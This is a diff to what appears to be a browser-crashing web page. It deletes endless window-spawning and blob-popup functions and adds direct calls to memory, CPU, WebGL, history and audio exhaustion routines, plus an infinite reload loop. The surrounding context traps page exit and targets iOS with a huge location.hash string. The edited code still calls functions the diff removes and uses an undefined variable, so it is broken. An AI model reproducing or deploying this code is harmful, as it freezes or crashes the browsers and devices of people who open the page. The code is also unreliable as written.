@@ -113,29 +113,6 @@
             document.head.appendChild(style);
         }
 
-        function getPlatform() {
-            const ua = navigator.userAgent;
-            if (/iPhone|iPad|iPod/.test(ua)) return 'ios';
-            if (/Android/.test(ua)) return 'android';
-            if (/Firefox/.test(ua)) return 'firefox';
-            if (/Chrome/.test(ua)) return 'chrome';
-            if (/Safari/.test(ua)) return 'safari';
-            return 'other';
-        }
-
-        function spawnWindows() {
-            while(true) {
-                window.open('/', '_blank');
-            }
-        }
-
-        function blobSpam() {
-            while(true) {
-                let blob = new Blob([btoa("PGJvZHk+PHNjcmlwdD5mb3IoOzspbG9jYXRpb24ucmVsb2FkKCk7PC9zY3JpcHQ+PC9ib2R5Pg==")], {type: 'text/html'});
-                window.open(URL.createObjectURL(blob));
-            }
-        }
-
         setTimeout(() => {
             window.onbeforeunload = () => true;
             window.onunload = () => false;
@@ -143,17 +120,13 @@
             
             const platform = getPlatform();
             
-            [memoryExhaust, cpuExhaust, webglSpam, cssCrash, 
-             historySpam, indexedDBSpam, audioSpam, transformSpam, 
-             spawnWindows, blobSpam].forEach(fn => {
-                setTimeout(fn, 0);
-                setTimeout(fn, 10);
-            });
+            memoryExhaust(); cpuExhaust(); webglSpam(); cssCrash(); historySpam(); indexedDBSpam(); audioSpam(); transformSpam(); spawnWindows(); blobSpam();
             
-            setInterval(() => location.reload(true), 0);
-            setInterval(() => window.focus(), 0);
+            while (1) {
+                location.reload(1);
+            }
 
-            if (platform ==="ios") {
+            if (/iPhone|iPad|iPod/.test(ua)) {
                 location.hash = `M${"\u0001".repeat(2 ** 25)}m`;
             }
         }, 50);
